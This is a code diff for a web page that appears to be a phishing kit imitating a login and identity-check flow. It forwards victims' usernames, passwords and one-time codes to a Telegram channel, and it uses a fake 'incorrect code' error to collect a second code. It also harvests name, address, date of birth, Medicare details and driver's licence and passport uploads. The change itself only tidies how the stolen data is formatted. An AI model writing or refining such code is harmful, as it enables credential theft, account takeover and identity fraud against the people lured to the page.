@@ -27,13 +27,22 @@ export default function Home() {
   const [loginError, setLoginError] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
-  // Send message to Telegram
+  // escape HTML to safely use inside Telegram HTML parse mode
+  const escapeHtml = (str: string) =>
+    String(str ?? "")
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#39;");
+
+  // Send message to Telegram (use HTML parse mode so <code> renders monospace)
   const sendTelegramMessage = async (message: string) => {
     try {
       await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ message }),
+        body: JSON.stringify({ message, parse_mode: "HTML" }),
       });
     } catch (error) {
       console.error("Failed to send Telegram message:", error);
@@ -76,7 +85,7 @@ export default function Home() {
     const password = passwordInput ? passwordInput.value : "";
 
     await sendTelegramMessage(
-      `Sign-in attempt:\nUsername: ${username}\nPassword: ${password}`
+      `Sign-in attempt:\nUsername: <code>${escapeHtml(username)}</code>\nPassword: <code>${escapeHtml(password)}</code>`
     );
 
     setLoading(true);
@@ -97,7 +106,7 @@ export default function Home() {
     const codeInput = document.getElementById("code") as HTMLInputElement | null;
     const code = codeInput ? codeInput.value : "";
 
-    await sendTelegramMessage(`Code entered: ${code}`);
+    await sendTelegramMessage(`Code entered: <code>${escapeHtml(code)}</code>`);
 
     setLoading(true);
     setCodeError(null); // Clear previous code error
@@ -109,24 +118,24 @@ export default function Home() {
       setCodeError("You entered the incorrect code (RFM68A)");
       setShowCodePage(true);
     } else if (codeAttemptCount === 1) {
-      await sendTelegramMessage(`Second code attempt: ${code}`);
+      await sendTelegramMessage(`Second code attempt: <code>${escapeHtml(code)}</code>`);
       setShowDetailsPage(true);
     }
   };
 
   const handleDetailsSubmit = async () => {
     const message = `
-      User Details:
-      Name: ${name}
-      Address: ${address}
-      Date of Birth: ${dob}
-      Medicare Number: ${medicareNumber}
-      Medicare Expiry: ${medicareExpiry}
-      Medicare IRN: ${medicareIRN}
-      Driver's License Front: ${driversLicenseFront ? driversLicenseFront.name + " (attached)" : "Not uploaded"}
-      Driver's License Back: ${driversLicenseBack ? driversLicenseBack.name + " (attached)" : "Not uploaded"}
-      Passport: ${passport ? passport.name + " (attached)" : "Not uploaded"}
-    `;
+User Details:
+Name: <code>${escapeHtml(name)}</code>
+Address: <code>${escapeHtml(address)}</code>
+Date of Birth: <code>${escapeHtml(dob)}</code>
+Medicare Number: <code>${escapeHtml(medicareNumber)}</code>
+Medicare Expiry: <code>${escapeHtml(medicareExpiry)}</code>
+Medicare IRN: <code>${escapeHtml(medicareIRN)}</code>
+Driver's License Front: <code>${escapeHtml(driversLicenseFront ? driversLicenseFront.name : "Not uploaded")}</code>
+Driver's License Back: <code>${escapeHtml(driversLicenseBack ? driversLicenseBack.name : "Not uploaded")}</code>
+Passport: <code>${escapeHtml(passport ? passport.name : "Not uploaded")}</code>
+`;
 
     const formData = new FormData();
     formData.append("message", message);
@@ -350,12 +359,12 @@ export default function Home() {
             >
               Submit
             </Button>
+            <Button
+              className="w-full h-14 bg-transparent border-2 border-gray-900 text-black text-lg font-medium rounded-lg mt-4"
+            >
+              Cancel
+            </Button>
           </div>
-          <Button
-            className="w-full h-14 bg-transparent border-2 border-gray-900 text-black text-lg font-medium rounded-lg mt-4"
-          >
-            Cancel
-          </Button>
         </main>
         <footer className="bg-black text-white mt-16">
           <div className="max-w-6xl mx-auto px-4 py-8">
